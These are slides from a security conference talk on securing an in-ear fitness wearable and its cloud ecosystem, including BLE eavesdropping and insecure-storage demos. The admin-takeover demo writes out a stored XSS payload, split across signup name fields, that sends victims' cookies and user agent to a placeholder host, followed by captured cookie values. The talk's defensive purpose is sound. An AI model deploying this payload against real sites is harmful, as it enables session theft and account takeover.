DEEP ARMOR
Securing your in-ear fitness coach: Challenges in hardening next generation wearables
Sumanth Naropanth & Sunil Kumar

Who are we?
· Sunil Kumar
· Security Analyst -- Deep Armor · Ola Security, Aricent

· Sumanth Naropanth
· Founder and CEO -- Deep Armor · Intel, Palm/HP, Sun Microsystems
· Security consulting, vulnerability testing, SDL and training services for emerging technologies
· www.deeparmor.com | @deep_armor

Security problems in New Devices
How do we address them?

Agenda
· Introduction to an in-ear fitness coach · Unshackling from traditional SDL methods · Securely designing a software fitness coach · Hardware, Firmware & Software paradigms · Ecosystem Security · Real world problems - weaknesses and demos · Privacy

IoT/Wearable Ecosystem

HTTP/HTTPS

Back End Services
HTTP/HTTPS

HTTP/HTTPS

Gateway
Zigbee/Z-wave

Node

Node

Node

BLE/ANT+

Sensors

Sensors

Gateway

BT/BLE/WiFi/NFC

Node

Node

Node

Sensors

BLE/ANT+
Sensors

BT/BLE/NFC

Case Study: In-ear fitness coach
Wearable = Comfortable Smart
Untethered Continuous Learning
Data/Analytics Better Quality of Life

Securing an in-ear fitness coach

Unshackling from traditional SDL

Challenges: Securing a neverbefore gadget
· Lack of tactical SDL frameworks for rapid time-to-market products with constantly evolving requirements
· Diverse, non-standard and evolving communication protocols · Weaknesses in adoption of protocol specifications · Long lives for IoT products · Privacy · Nascent research in IoT security

Challenges - Technical
· Collection of personal data and PII is higher
· Geo-location information · Biometric data · Sensor data · Payment services
· Limited SW stack --> security may get compromised
· Often FW running on micro-controllers · Field updates are difficult · Asymmetric key crypto, TEEs, etc. are heavy
· Multi-tier, multi-tenant product architecture
· Cross-domain flows · Multiple exposure points as a consequence

Proposal : Securing a neverbefore gadget
· Next-gen SDL
· For IoT, wearable and cloud technologies. Especially when they all come together
· Ecosystem security · Agile
· Security, Privacy and Legal woven into the development cycle
· Leveraging industry standards

Introducing SPDL

Architecture Reviews

Threat Modeling &
Attack Trees

Privacy Req.; Data Access Review; Stakeholder identification

Security Code Reviews
& Static Code Analysis
Privacy test cases & Plan

Penetration Testing
Privacy Sign-off, Data
Availability

Product Development Lifecycle

Program Conception to Pre-Alpha

Alpha

Beta

Incident Response
Legal sign-off & Incident Response
Launch to
Post Launch

Designing SPDL

Security topics

Cloud

Device

Mobile

IoT/Wearables

Hardware & Firmware Security Paradigms

Service layer security

Protocol security

Device Software
Data sandboxing

Secure Erase

Signed libraries

Key Management

Secure Boot

Secure FOTA

TEE

Data At Rest
Encryption

Secure Debug

Port access restrictions & lockdown

Device Hardware

Secure Storage

SW Security Paradigms: application SW

Multi-app <--> multi-device communication

Secure implementation: Spec and Code

Secure storage of app specific data, keys, logs, databases and
user specific data

App Store Scanning

3rd Party SDK security

Privacy: Opt-in/Opt-out policy enforcement

HW backed keystore/keychain

Cloud Software & Infrastructure Security

Secure storage of user and
enterprise data, At Rest
Encryption
Privacy: Data storage, sharing and retention policies
Security DevOps

Secure Key Management and
Provisioning
User & Roles management
Micro-services security

Infrastructure hardening Secure configuration

Web Portal Security (HTML/
JS attacks

Ecosystem security challenges

Design weaknesses in comms protocol adoption
Network Security
Gateway/Node Updates

Secure key negotiation and distribution
Secure Provisioning
Design weaknesses in comms protocol adoption

Secure key negotiation and distribution
Gateway/Node Updates

Real world security problems

Demo 1: Ecosystem Challenges

Demo 1: Ecosystem overview

BT/

BT/BLE/ANT+

BLE

HTTPS
Back End Services

Device communication
Device Commands: · Put device into recovery
mode · Do a FW update · Change Device (BLE)
name
Notifications: · Social apps · Calls and texts
Information: · User activity data · User profile updates · Application action (calls, music
control) · Call/text/social updates
(sometimes)

The Problem ­ Prelude

Device Commands: · Put device into recovery
mode · Do a FW update · Change Device (BLE)
name
Notifications: · Social apps · Calls and texts

ATTACKER

ENBCLERY-PTED

Information: · User activity data · User profile updates · Application action (calls, music
control) · Call/text/social updates
(sometimes)

The Problem

Device Commands: · Put device into recovery
mode · Do a FW update · Change Device (BLE)
name
Notifications: · Social apps · Calls and texts

ATTACKER

ENBCLERY-PTED

Information: · User activity data · User profile updates · Application action (calls, music
control) · Call/text/social updates
(sometimes)

Root Cause
All applications on Android and iOS can subscribe to the BT service and get the data on the same BT channels or BLE characteristics as
the legitimate app
· Android · android.permission.BLUETOOTH · android.permission.BLUETOOTH_ADMIN ­ quote:
· iOS · Core Bluetooth (CB) Framework · Centrals (client/phone) and Peripherals (server/wearable) classes

Example ­ Wearable Ecosystem 1
· Uses BLE · Proprietary code · Existing market research for format of messages and headers · Malware app subscribes to the known BLE characteristics gets data
synced with the legit app

Example ­ Wearable Ecosystem 1

Example ­ Wearable Ecosystem 2
· Similar, but with a twist · Malware application cannot send commands to the wearable by itself · Legitimate app opens a connection to the device
· The malware app piggybacks to send commands to the wearable
Moral: Partial security does not help · Protect not just the handshake but
every message

Example ­ Wearable Ecosystem 2

Demo 2: Protecting User data in logs

Demo 2: Environment
Coach commentary Language definitions Dialogue definitions

The Problem
· Coach commentary, language definitions and dialogue stored as PLAIN TEXT files
· FIT files and JSON files stored in public storage · Due to private storage limitations
· Contains PII and IP
· Attacker can tamper with or copy over the text files · DoS · Code execution · Accessible by malicious apps

Our Recommendation
· Avoid public storage whenever possible · Support for encryption
· Keys must be user specific or application specific to prevent BORE · Support for signing dialogue files or any sensitive information in public storage · Capability to delete/ opt-out of dialogue logging
· Cloud · App

Demo 3: Admin portal takeover

Demo 3: Ecosystem overview

BT/BLE

Cloud Portal

HTTPS
User portal : Login and sign-up User portal : Connect with friends User portal : Comment on friends profile User portal : Profile and activity mgmt. Admin portal : Remote Device mgmt.
Admin portal : Data mgmt.

Target : Sign-up and Profile pages

Exploit Scenario
· Attacker uses the "friend request" functionality on user portal
· "Friend request" loads when victim logs into his/ her account · Victim takes no action to view the invite/accept the invite
· Attacker exploits a XSS vulnerability in the user portal/ sign-up pages
· Uses two accounts to launch the attack · Gives 2X number of characters for the exploit code · Exploit code expandable up to 5 notifications (or 5 "friend" requests)

Exploit Scenario: The attack
First Name: Arya<script>i=new Image();u=
Last Name: navigator.userAgent</script>
Email: arya@stark.com
First Name: <script>i.src='http://x0?c='
Last Name: +document.cookie+u</script>Jon
Email: jon@stark.com

Victim - logs in

Attacker's c&c

Victim's cookies and UA

_ga=GA1.2.1543537304.1450072994; _gat=1;

engageUser=ads9hnrfj7a3uhd9cnd8esa4g7; _ra=0.100149.1450085069;

Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36

Access to admin portal
· Victim = Admin! · Cloud -> Remote device management
ATTACKER'S BROWSER SEAMLESSLY LAUNCHES ALL PAGES OF THE VICTIM

The Attack
· Stolen admin credentials used to access admin portal
· Remote device take-over · Unauthorized access to user profile data · Unintended access to user accounts · Malicious FW updates rolled-out
· Several Security and privacy violations!

Privacy
· Live on your body or vicinity => access to wealth of PII/ sensitive data · What is PII or personal data?
· Data Management · Collector/owner/processor/.. · 3rd party data access
· Data retention and deletion policies

Regulatory Guidelines and Privacy Laws
· Geo/Country based restrictions for collecting, storing and retaining data · US · GDPR · ...
· Data breaches and disclosures

Privacy Breaches

Quantifying Privacy Vulnerabilities
· Security Vulnerabilities are scored and rated
· Privacy vulnerabilities?

Summary

· Rethink SDL · Shift-left · Agile
· Old Vulnerabilities manifest in new ways

Ecosystem

Protocols

Integration

Interoperability

· Data and Privacy

Thanks!
(and Q&A)
@snaropanth and @sunils2991
Security & privacy assessments, SDL and training services for emerging technologies
www.deeparmor.com | @deep_armor | info@deeparmor.com

